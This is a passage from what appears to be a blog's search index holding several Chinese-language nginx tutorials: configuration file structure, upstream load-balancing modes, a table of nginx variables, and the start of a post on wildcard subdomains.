web缓存\n\nnginx可以对不同的文件做不同的缓存处理，配置灵活，并且支持FastCGI_Cache，主要用于对FastCGI的动态程序进行缓存。配合着第三方的ngx_cache_purge，对制定的URL缓存内容可以的进行增删管理。\n\n\n\n# 二. nginx配置文件结构\n\n\n\n先放一个配置demo\n\n```nginx\nuser  nobody;\nworker_processes  1;\npid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nupstream mysvr {   \n  server 127.0.0.1:7878;\n  server 192.168.10.121:3333 backup;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n  \n    server {\n        listen       80;\n        server_name  localhost;\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n    }\n}\n```\n\n\n\n### 2.1 配置文件结构\n\n+ main(全局块)[一个]\n+ events (nginx工作模式)[一个]\n\n+ http(http设置)[一个]\n  + server(主机设置)[http里多个]\n    + location(URL匹配)[server里多个]\n  + upstream(负载均衡服务器设置)[http里一个]\n\n\n\n1、全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。\n\n2、events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。\n\n3、http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。\n\n4、server块：配置虚拟主机的相关参数，一个http中可以有多个server。\n\n5、location块：配置请求的路由，以及各种页面的处理情况。\n\n6、upstream块：负责负载均衡\n\n\n\n```nginx\n########### 每个指令必须有分号结束。#################\n\n#user administrator administrators;  #配置用户或者组，默认为nobody nobody。\n#worker_processes 2;  #允许生成的进程数，默认为1\n#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址\n\nerror_log log/error.log debug;  #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别分别为：debug|info|notice|warn|error|crit|alert|emerg\n\n\nevents {\n    accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on\n    multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off\n    #use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport\n    worker_connections  1024;    #最大连接数，默认为512\n}\n\n\nhttp {\n    include       mime.types;   #文件扩展名与文件类型映射表\n    default_type  application/octet-stream; #默认文件类型，默认为text/plain\n    #access_log off; #取消服务日志    \n    log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式\n    access_log log/access.log myFormat;  #combined为日志格式的默认值\n  \n \n    sendfile on;   #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。\n    sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。\n    keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。\n\n    upstream mysvr {   \n      server 127.0.0.1:7878;\n      server 192.168.10.121:3333 backup;  #热备\n    }\n  \n    error_page 404 https://www.baidu.com; #错误页\n    \n  \tserver {\n        keepalive_requests 120; #单连接请求上限次数。\n        listen       4545;   #监听端口\n        server_name  127.0.0.1;   #监听地址       \n        \n    \t\tlocation  ~*^.+$ {       #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。\n           #root path;  #根目录\n           #index vv.txt;  #设置默认页\n           proxy_pass  http://mysvr;  #请求转向mysvr 定义的服务器列表\n           deny 127.0.0.1;  #拒绝的ip\n           allow 172.18.5.54; #允许的ip           \n        }\n    }\n}\n```\n\n\n\n+ `$remote_addr` 与`$http_x_forwarded_for` 用以记录客户端的ip地址； \n+ `$remote_user` 用来记录客户端用户名称； \n+ `$time_local` 用来记录访问时间与时区；\n+ `$request` 用来记录请求的url与http协议；\n+ `$status` 用来记录请求状态；成功是200， \n+ `body_bytes_sent` 记录发送给客户端文件主体内容大小；\n+ `$http_referer` 用来记录从那个页面链接访问过来的； 8.$http_user_agent ：记录客户端浏览器的相关信息；\n\n+ 惊群现象：一个网路连接到来，多个睡眠的进程被同时叫醒，但只有一个进程能获得链接，这样会影响系统性能。\n\n+ 每个指令必须有分号结束。\n\n\n\n# 三. 模块配置说明\n\n### 3.1 main模块\n\n```nginx\nuser nobody nobody;\nworker_processes 2;\nerror_log  /usr/local/var/log/nginx/error.log  notice;\npid        /usr/local/var/run/nginx/nginx.pid;\nworker_rlimit_nofile 1024;\n```\n\n\n\n+ user 来指定Nginx Worker进程运行用户以及用户组，默认由nobody账号运行。\n\n+ worker_processes来指定了Nginx要开启的子进程数。每个Nginx进程平均耗费10M~12M内存。根据经验，一般指定1个进程就足够了，如果是多核CPU，建议指定和CPU的数量一样的进程数即可。我这里写2，那么就会开启2个子进程，总共3个进程。可以写 auto.\n\n+ error_log用来定义全局错误日志文件。日志输出级别有debug、info、notice、warn、error、crit可供选择，其中，debug输出日志最为最详细，而crit输出日志最少。\n\n+ pid用来指定进程id的存储文件位置。\n\n+ worker_rlimit_nofile用于指定一个nginx进程可以打开的最多文件描述符数目，这里是65535，需要使用命令“ulimit -n 65535”来设置。\n\n  \n\n### 3.2 events 模块\n\nevents模块来用指定nginx的工作模式和工作模式及连接数上限\n\n```nginx\nevents {\n     use kqueue; #mac平台\n     worker_connections  1024;\n}\n```\n\n\n\n+ use用来指定Nginx的工作模式。Nginx支持的工作模式有select、poll、kqueue、epoll、rtsig和/dev/poll。其中select和poll都是标准的工作模式，kqueue和epoll是高效的工作模式，不同的是epoll用在Linux平台上，而kqueue用在BSD系统中，因为Mac基于BSD,所以Mac也得用这个模式，对于Linux系统，epoll工作模式是首选。\n\n+ worker_connections用于定义Nginx每个进程的最大连接数，即接收前端的最大请求数，默认是1024。最大客户端连接数由worker_processes和worker_connections决定\n+ 即Max_clients=worker_processes*worker_connections，在作为反向代理时，Max_clients变为：Max_clients = worker_processes * worker_connections/4。 \n\n+ 进程的最大连接数受Linux系统进程的最大打开文件数限制，在执行操作系统命令“ulimit -n 65536”后worker_connections的设置才能生效。\n\n\n\n### 3.3 http 模块\n\nhttp模块可以说是最核心的模块了，它负责HTTP服务器相关属性的配置，它里面的server和upstream子模块，至关重要。\n\n```nginx\nhttp {\n     include       mime.types;\n     default_type  application/octet-stream;\n     log_format  main  'remote_addr - remote_user [time_local] \"request\" '\n                       'status body_bytes_sent \"$http_referer\" '\n                       '\"http_user_agent\" \"http_x_forwarded_for\"';\n     access_log  /usr/local/var/log/nginx/access.log  main;\n     sendfile        on;\n     tcp_nopush      on;\n     tcp_nodelay     on;\n     keepalive_timeout  10;\n     #gzip  on;\n     \n     upstream myproject {\n         .....\n     }\n     \n  \t server {\n         ....\n     }\n}\n```\n\n\n\n+ include 用来设定文件的mime类型,类型在配置文件目录下的mime.type文件定义，来告诉nginx来识别文件类型。\n\n+ default_type设定了默认的类型为二进制流，也就是当文件类型未定义时使用这种方式。\n\n+ log_format用于设置日志的格式，和记录哪些参数，这里设置为main，刚好用于access_log来记录这种类型。\n\n  main的类型日志如下：也可以增删部分参数。\n\n  127.0.0.1 - - [21/Apr/2015:18:09:54 +0800] \"GET /index.php HTTP/1.1\" 200 87151 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\" \n\n+ access_log 用来纪录每次的访问日志的文件地址，后面的main是日志的格式样式，对应于log_format的main。\n\n+ sendfile参数用于开启高效文件传输模式。\n+ 将tcp_nopush和tcp_nodelay两个指令设置为on用于防止网络阻塞。\n\n+ keepalive_timeout设置客户端连接保持活动的超时时间。在超过这个时间之后，服务器会关闭该连接。\n\n\n\n### 3.4 server 模块 (http的子模块, 虚拟主机)\n\nsever 模块是http的子模块，它用来定一个虚拟主机。我们看一下一个简单的server 是如何做的？\n\n```nginx\nserver {\n         listen       8080;\n         server_name  test.liuvv.com;\n         root   /home/levonfly/www;         # 全局定义，如果都是这一个目录，这样定义最简单。\n         index  index.php index.html index.htm; \n         charset utf-8;\n         access_log  usr/local/var/log/host.access.log  main;\n         aerror_log  usr/local/var/log/host.error.log  error;\n         ....\n}\n```\n\n+ server标志定义虚拟主机开始。 \n\n+ listen用于指定虚拟主机的服务端口。 \n\n+ server_name用来指定IP地址或者域名，多个域名之间用空格分开。 \n\n+ root 表示在这整个server虚拟主机内，全部的root web根目录。注意要和locate {}下面定义的区分开来。 \n\n+ index 全局定义访问的默认首页地址。注意要和locate {}下面定义的区分开来。 \n\n+ charset用于设置网页的默认编码格式。 \n\n+ access_log用来指定此虚拟主机的访问日志存放路径，最后的main用于指定访问日志的输出格式。\n\n\n\n### 3.5 location 模块(server的子模块, 重要)\n\nlocation模块是nginx中用的最多的，也是最重要的模块了，什么负载均衡啊、反向代理啊、虚拟域名啊都与它相关。\n\nlocation 根据它字面意思就知道是来定位的，定位URL，解析URL，所以，它也提供了强大的正则匹配功能，也支持条件判断匹配，用户可以通过location指令实现Nginx对动、静态网页进行过滤处理。\n\n\n\n我们先来看这个，设定默认首页和虚拟机目录。\n\n```nginx\nlocation / {\n\troot   /home/levonfly/www;\n\tindex  index.php index.html index.htm;\n}\n```\n\n+ location /表示匹配访问根目录。\n\n+ root指令用于指定访问根目录时，虚拟主机的web目录，这个目录可以是相对路径（相对路径是相对于nginx的安装目录）。也可以是绝对路径。\n\n+ index用于设定我们只输入域名后访问的默认首页地址，有个先后顺序：index.php index.html index.htm，如果没有开启目录浏览权限，又找不到这些默认首页，就会报403错误。\n\n  \n\nlocation 还有一种方式就是正则匹配，开启正则匹配这样：`location ~`。后面加个`~`。下面这个例子是运用`正则匹配`来链接php。\n\n```nginx\nlocation ~ \\.php$ {\n            root           /home/levonfly/www;\n            fastcgi_pass   127.0.0.1:9000;\n            fastcgi_index  index.php;\n            include        fastcgi.conf;\n        }\n```\n\n`\\.php$` 熟悉正则的我们直到，这是匹配`.php`结尾的URL，用来解析php文件。里面的`root`也是一样，用来表示虚拟主机的根目录。 \n`fast_pass`链接的是`php-fpm` 的地址，之前我们也搭建过。其他几个参数我们以后再说。\n\n\n\n### 3.6 upstream 模块(http子模块)\n\nupstream 模块负债负载均衡模块，通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡。我先学习怎么用，具体的使用实例以后再说。\n\n```nginx\nupstream liuvv.com{\n     ip_hash;\n     server 192.168.12.1:80;\n     server 192.168.12.2:80 down;\n     server 192.168.12.3:8080  max_fails=3  fail_timeout=20s;\n     server 192.168.12.4:8080;\n}\n```\n\n在上面的例子中，通过upstream指令指定了一个负载均衡器的名称liuvv.com。这个名称可以任意指定，在后面需要的地方直接调用即可。\n\n\n\n里面是ip_hash这是其中的一种负载均衡调度算法，下面会着重介绍。紧接着就是各种服务器了。用server关键字表识，后面接ip。\n\nNginx的负载均衡模块目前支持4种调度算法:\n\n1. weight 轮询（默认）。每个请求按时间顺序逐一分配到不同的后端服务器，如果后端某台服务器宕机，故障系统被自动剔除，使用户访问不受影响。weight。指定轮询权值，weight值越大，分配到的访问机率越高，主要用于后端每个服务器性能不均的情况下。\n2. ip_hash。每个请求按访问IP的hash结果分配，这样来自同一个IP的访客固定访问一个后端服务器，有效解决了动态网页存在的session共享问题。\n3. fair。比上面两个更加智能的负载均衡算法。此种算法可以依据页面大小和加载时间长短智能地进行负载均衡，也就是根据后端服务器的响应时间来分配请求，响应时间短的优先分配。Nginx本身是不支持fair的，如果需要使用这种调度算法，必须下载Nginx的upstream_fair模块。\n4. url_hash。按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，可以进一步提高后端缓存服务器的效率。Nginx本身是不支持url_hash的，如果需要使用这种调度算法，必须安装Nginx 的hash软件包。\n\n\n\n在HTTP Upstream模块中，可以通过server指令指定后端服务器的IP地址和端口，同时还可以设定每个后端服务器在负载均衡调度中的状态。常用的状态有：\n\n- down，表示当前的server暂时不参与负载均衡。\n- backup，预留的备份机器。当其他所有的非backup机器出现故障或者忙的时候，才会请求backup机器，因此这台机器的压力最轻。\n- max_fails，允许请求失败的次数，默认为1。当超过最大次数时，返回proxy_next_upstream 模块定义的错误。\n- fail_timeout，在经历了max_fails次失败后，暂停服务的时间。max_fails可以和fail_timeout一起使用。\n\n**注意** 当负载调度算法为ip_hash时，后端服务器在负载均衡调度中的状态不能是weight和backup。\n\n\n\n# 四. nginx 配置实战\n\n### 4.1 nginx指令\n\n```\nnginx -s signal\n```\n\nWhere *signal* may be one of the following:\n\n- stop — fast shutdown\n- quit — graceful shutdown\n- reload — reloading the configuration file\n- reopen — reopening the log files\n\n\n\n### 4.2 nginx 快速配置教程\n\nhttps://nginx.org/en/docs/beginners_guide.html\n\n##### 4.2.1 如果有多个location模块, 匹配最长的\n\n```nginx\n    location / {\n            root /home/levonfly/www;\t#http://test.liuvv.com/\n    }\n\n    location /images/ { # 路径是两者相加/home/levonfly/images/\n            root /home/levonfly;\t#http://test.liuvv.com/images/1.png\n    }\n```\n\n##### 4.2.2 一个nginx实例可以通过listen监听不同端口\n\n```nginx\nserver {\n    listen 8080;\n    root /home/levonfly/8080;  # location没有root, 就用这里的root, 继承关系\n\n    location / {\n    }\n}\n\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        location / {\n                proxy_pass http://localhost:8080;\n        }\n        location /images/ {   \n                root /home/levonfly/; # http://test.liuvv.com/images/1.png\n        }\n  \n  \t    #location ~ \\.(gif|jpg|png)$ {  # 1.判断后缀 2. 波浪线是正则\n        #        root /home/levonfly/images; # http://test.liuvv.com/1.png\n        #}\n}\n```\n\n##### 4.2.3 fastcgi方式\n\nnginx本身不能处理php，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回给nginx. php-fpm是一个php fastcgi管理器, 目前直接集成在php中.\n\n\n\n安装php:\n\n```bash\nsudo apt install php\nsudo systemctl restart php7.0-fpm.service\n```\n\nnginx配置:\n\n```nginx\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        root /home/levonfly/www;\n        index index.php index.html index.htm;\n  \n        location ~* \\.php$ {\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n                include         fastcgi_params;\n                fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n                fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n        }\n}\n```\n\n### 4.3 虚拟主机配置\n\nnginx 使用域名，主要是使用`server`模块下的` server_name`选项。\n\n参考: http://www.liuvv.com/p/d039.html\n\n### 4.4 URL路由重写\n\nnginx 使用url 重写，主要是使用`server`模块下的` location`模块。\n\n参考: http://www.liuvv.com/p/51e59d76.html\n\n### 4.5 反向代理配置\n\nnginx 使用反向代理，主要是使用 `server`模块下 `location`模块下的`proxy_pass`选项。\n\n参考: http://www.liuvv.com/p/51e59d76.html\n\n### 4.6 负载均衡配置\n\nnginx 使用反向代理，主要是使用`upstream`模块(和server 平级)。\n\n参考: https://www.liuvv.com/p/4c38afcc.html\n\n\n\n# 五. 参考资料\n\n+ nginx的配置、虚拟主机、负载均衡和反向代理\n\n  https://www.zybuluo.com/phper/note/89391  \n\n  https://www.zybuluo.com/phper/note/90310  \n\n  https://www.zybuluo.com/phper/note/133244  \n\n+ nginx 配置详解\n\n  https://my.oschina.net/duxuefeng/blog/34880\n\n  http://www.nginx.cn/591.html \n\n  https://jkzhao.github.io/2018/01/23/Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E5%8F%8A%E4%BC%98%E5%8C%96 \n\n  https://www.kancloud.cn/curder/nginx/96672 \n\n+ 在线生成nginx 配置\n\n   https://nginxconfig.io\n   \n+ nginx 优秀教程\n\n   https://xuexb.github.io/learn-nginx/example/  \n\n   https://www.kancloud.cn/hfpp2012/nginx-tutorial/467009\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx通过upstream实现负载均衡","url":"%2Fp%2F4c38afcc.html","content":"\n\n\n### 1. nginx upstream 负载均衡\n\nupstream 模块负债负载均衡模块，如果Nginx没有仅仅只能代理一台服务器的话，那它也不可能像今天这么火，Nginx可以配置代理多台服务器，当一台服务器宕机之后，仍能保持系统可用。具体配置过程如下：\n\n 在http节点下，添加upstream节点。\n\n```nginx\nupstream levonfly { \n      server 10.0.6.108:7080; \n      server 10.0.0.85:8980; \n}\n```\n\n将server节点下的location节点中的proxy_pass配置为：http:// + upstream名称，即\"http://levonfly\".\n\n```nginx\nlocation / { \n            root  html; \n            index  index.html index.htm; \n            proxy_pass http://levonfly; \n}\n```\n\n现在负载均衡初步完成了。upstream按照轮询（默认）方式进行负载，每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。虽然这种方式简便、成本低廉。\n<!-- more -->\n\n\n### 2. upstream 负载均衡的模式\n\nnginx的upstream支持5种分配方式，下面将会详细介绍，其中，前三种为Nginx原生支持的分配方式，后两种为第三方支持的分配方式：\n\n##### 2.1 轮询(默认)\n\n轮询是upstream的默认分配方式，即每个请求按照时间顺序轮流分配到不同的后端服务器，如果某个后端服务器down掉后，能自动剔除。\n\n```nginx\nupstream backend {\n  server 192.168.1.101:8888;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:8888;\n}\n```\n\n##### 2.2 weight        \n\n轮询的加强版，即可以指定轮询比率，weight和访问几率成正比，主要应用于后端服务器异质的场景下。\n\n```nginx\nupstream backend {\n  server 192.168.1.101 weight=1;\n  server 192.168.1.102 weight=2;\n  server 192.168.1.103 weight=3; # 是101访问率的3倍\n}\n```\n\n##### 2.3 ip_hash        \n\n每个请求按照访问ip（即nginx的前置服务器或者客户端IP）的hash结果分配，这样每个访客会固定访问一个后端服务器，可以解决session一致问题。\n\n```nginx\nupstream backend {\n  ip_hash;\n  server 192.168.1.101:7777;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:9999;\n}\n```\n\n##### 2.4 fair(第三方) \n\nfair顾名思义，公平地按照后端服务器的响应时间（rt）来分配请求，响应时间短即rt小的后端服务器优先分配请求。\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  fair;\n}\n```\n\n##### 2.5 url_hash(第三方)\n\n与ip_hash类似，但是按照访问url的hash结果来分配请求，使得每个url定向到同一个后端服务器，主要应用于后端服务器为缓存时的场景下。\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  hash $request_uri;\n  hash_method crc32;\n}\n```\n\n注意：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法。\n\n\n\n### 3. upstream 其他参数\n\nupstream中server指令语法如下：`server address [parameters]` ,  关键字server必选, address也必选，可以是主机名、域名、ip或unix socket，也可以指定端口号。\n\nupstream还可以为每个设备设置状态值，这些状态值的含义分别如下：\n\n+ down 表示单前的server暂时不参与负载.\n\n+ weight 默认为1.    weight越大，负载的权重就越大。\n\n+ max_fails ：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream 模块定义的错误.\n\n+ fail_timeout : max_fails次失败后，暂停的时间。\n\n+ backup： 表示当前server是备用服务器，只有其它非backup后端服务器都挂掉了或者很忙才会分配到请求。\n\n```nginx\nupstream bakend{ #定义负载均衡设备的Ip及设备状态 \n      ip_hash; \n      server 10.0.0.11:9090 down; \n      server 10.0.0.11:8080 weight=2; \n      server 10.0.0.11:6060; \n      server 10.0.0.11:7070 backup; \n}\n```\n\n##### 3.1 注意:\n\nmax_fails和fail_timeout一般会关联使用，如果某台server在fail_timeout时间内出现了max_fails次连接失败，那么Nginx会认为其已经挂掉了，从而在fail_timeout时间内不再去请求它，fail_timeout默认是10s，max_fails默认是1，即默认情况是只要发生错误就认为服务器挂掉了，如果将max_fails设置为0，则表示取消这项检查。\n\n\n\n### 4. 实战配置:\n\n````nginx\nupstream levonfly {\n    server 127.0.0.1:13050;\n}\n\nupstream testing-levonfly {\n    server 172.25.61.25:13050;\n}\n\n\nserver {\n    server_name levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n\nserver {\n    server_name test.levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://testing-levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n````\n\n##### 4.1 遇到的问题:\n\n 如果不生效, 注意下 upstream 的缩进会造成问题\n\n\n\n### 5. 参考资料\n\n+ http://www.linuxe.cn/post-182.html\n\n+ https://www.cnblogs.com/wzjhoutai/p/6932007.html\n\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx全局变量","url":"%2Fp%2F80b24c5f.html","content":"\n### 1. 服务器相关\n\n| 变量名                | 备注                                                         | 示例                                               |\n| --------------------- | ------------------------------------------------------------ | -------------------------------------------------- |\n| `nginx_version`       | 当前运行的 Nginx 版本号                                      | 1.11.2                                             |\n| `server_port`         | 服务器端口                                                   | 8080                                               |\n| `server_addr`         | 服务器端地址                                                 | 127.0.0.1                                          |\n| `server_name`         | 服务器名称                                                   | 127.0.0.1                                          |\n| `server_protocol`     | 服务器的HTTP版本                                             | HTTP/1.0                                           |\n| `status`              | HTTP 响应代码                                                | 200                                                |\n| `time_iso8601`        | 服务器时间的 ISO 8610 格式                                   | 2018-09-02T15:14:27+08:00                          |\n| `time_local`          | 服务器时间（LOG Format 格式）                                | 02/Sep/2018:15:14:27 +0800                         |\n| `document_root`       | 当前请求的文档根目录或别名                                   | `/home/xiaowu/github/echo.xuexb.com`               |\n| `request_filename`    | 当前连接请求的文件路径，由 `root`或 `alias`指令与 URI 请求生成 | `/home/xiaowu/github/echo.xuexb.com/api/dump/path` |\n| `request_completion`  | 如果请求成功，值为”OK”，如果请求未完成或者请求不是一个范围请求的最后一部分，则为空 |                                                    |\n| `pid`                 | 工作进程的PID                                                | 1234                                               |\n| `msec`                | 当前的Unix时间戳                                             | 1535872750.954                                     |\n| `limit_rate`          | 用于设置响应的速度限制                                       | 0                                                  |\n| `pipe`                | 如果请求来自管道通信，值为“p”，否则为“.”                     | .                                                  |\n| `connection_requests` | TCP连接当前的请求数量                                        | 1                                                  |\n| `connection`          | TCP 连接的序列号                                             | 363861                                             |\n| `realpath_root`       | 当前请求的文档根目录或别名的真实路径，会将所有符号连接转换为真实路径 | /home/xiaowu/github/echo.xuexb.com                 |\n|                       \n\n<!-- more -->\n\n### 2. 客户端相关\n\n| 变量名              | 示例                                                         | 备注                                                         |\n| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| host                | echo.xuexb.com                                               | 优先级如下：HTTP请求行的主机名>”HOST”请求头字段>符合请求的服务器名 |\n| hostname            | bj01                                                         | 主机名                                                       |\n| remote_port         | 58500                                                        | 客户端端口                                                   |\n| remote_user         |                                                              | 用于HTTP基础认证服务的用户名                                 |\n| request             | GET /api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84%23123 HTTP/1.0 | 代表客户端的请求地址                                         |\n| remote_addr         | 127.0.0.1                                                    | 客户端地址                                                   |\n| request_body        |                                                              | 客户端的请求主体, 此变量可在location中使用，将请求主体通过proxy_pass, fastcgi_pass, uwsgi_pass, 和 scgi_pass传递给下一级的代理服务器 |\n| request_body_file   |                                                              | 将客户端请求主体保存在临时文件中文件处理结束后，此文件需删除如果需要之一开启此功能，需要设置client_body_in_file_only如果将次文件传递给后端的代理服务器，需要禁用request body，即设置proxy_pass_request_body off，fastcgi_pass_request_body off, uwsgi_pass_request_body off, or scgi_pass_request_body off |\n| proxy_protocol_addr |                                                              | 获取代理访问服务器的客户端地址，如果是直接访问，该值为空字符串(1.5.12) |\n| http_名称           | http_accept_language -> zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7  | 匹配任意请求头字段； 变量名中的后半部分“name”可以替换成任意请求头字段，如在配置文件中需要获取http请求头：“Accept-Language”，那么将“－”替换为下划线，大写字母替换为小写，形如：http_accept_language即可 |\n| bytes_sent          | 0                                                            | 传输给客户端的字节数 (1.3.8, 1.2.5)                          |\n| body_bytes_sent     | 0                                                            | 传输给客户端的字节数，响应头不计算在内；这个变量和Apache的mod_log_config模块中的“%B”参数保持兼容 |\n\n\n\n### 3. 客户端相关 - request headers\n\n| 变量名                           | 备注                                                         | 示例                                                         |\n| -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| `http_accept`                    | 浏览器支持的 MIME 类型                                       | `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8` |\n| `http_accept_encoding`           | 浏览器支持的压缩编码                                         | `gzip, deflate, br`                                          |\n| `http_accept_language`           | 浏览器支持的语言                                             | `zh-CN,zh;q=0.9,en;q=0.8`                                    |\n| `http_cache_control`             | 浏览器缓存                                                   | `max-age=0`                                                  |\n| `http_connection`                | 客户端与服务连接类型                                         |                                                              |\n| `http_cookie`                    | 浏览器请求 cookie                                            | `a=1; b=2`                                                   |\n| `http_host`                      | 浏览器请求 host                                              | echo.xuexb.com                                               |\n| `http_referer`                   | 浏览器来源                                                   | https://echo.xuexb.com/                                      |\n| `http_upgrade_insecure_requests` | 是一个请求首部，用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应，并且它可以成功处理 upgrade-insecure-requests CSP 指令 | 1                                                            |\n| `http_user_agent`                | 用户设备标识                                                 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36` |\n| `http_x_requested_with`          | 异步请求标识                                                 | true                                                         |\n| `http_x_forwarded_for`           | 反向代理原 IP                                                | 198.13.61.105                                                |\n\n\n\n### 4. 链接相关\n\n| 变量名           | 备注                                                         | 示例                                                       |\n| ---------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |\n| `scheme`         | 请求使用的 WEB 协议                                          | http                                                       |\n| `uri`            | 请求中的当前 URI(不带请求参数)，可以不同于浏览器传递的 `$request_uri` 的值，它可以通过内部重定向，或者使用 `index` 指令进行修改 | `/api/dump/path`                                           |\n| `document_uri`   | 同 `$uri`                                                    | `/api/dump/path`                                           |\n| `request_uri`    | 这个变量等于包含一些客户端请求参数的原始 URI ，它无法修改    | `/api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84` |\n| `request_method` | HTTP 请求方法                                                | GET                                                        |\n| `request_time`   | 处理客户端请求使用的时间，从读取客户端的第一个字节开始计时   | 0.000                                                      |\n| `request_length` | 请求的长度（包括请求地址、请求头和请求主体）                 | 678                                                        |\n| `args`           | 请求参数                                                     | `a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84`                |\n| `query_string`   | 同 `$args`                                                   |                                                            |\n| `is_args`        | 请求中是否有参数，有则为 `?` 否则为空                        | `?`                                                        |\n| `arg_参数名`     | 请求中具体的参数                                             | `$arg_a` => `1`                                            |\n| `https`          | 如果开启了 SSL 安全模式，则为 `on` 否则为空                  | `on`                                                       |\n\n\n\n### 5. 参考资料\n\n+ https://xuexb.github.io/learn-nginx/variable/\n+ https://nginx.org/en/docs/\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx泛域名解析","url":"%2Fp%2Fd039.html","content":"\n\n\n### 1. 域名概念\n\n##### 1.1 二级域名\n\n二级域名是指顶级域名之下的域名, 见下面的例子:\n\n- .com 顶级域名\n  - liuvv.com 一级域名(你花钱申请的)\n    - www.liuvv.com 二级域名\n    - blog.liuvv.com 二级域名\n    - 依次类推...\n\n有几点需要注意下:\n\n1. www.liuvv.com是属于二级域名,不过一般我们把这个域名配置指向一级域名访问.\n2. www.liuvv.com/news这种形式一般称之为网站的子页面子目录等,并不是二级域名.\n3. 另外类似.com.cn, .net.cn, .org.cn这种称之为二级域.\n\n##### 1.2 域名泛解析\n\n我们的目的是实现访问二级域名后转发请求.首先要实现的是二级域名的配置,一般使用Nginx泛解析来处理. 泛解析即利用通配符*来做次级域名以实现所有的次级域名均指向同一IP地址。\n\n泛解析的用途有:\n\n1. 可以让域名支持无限的子域名(这也是泛域名解析最大的用途)。\n2. 防止用户错误输入导致的网站不能访问的问题。\n3. 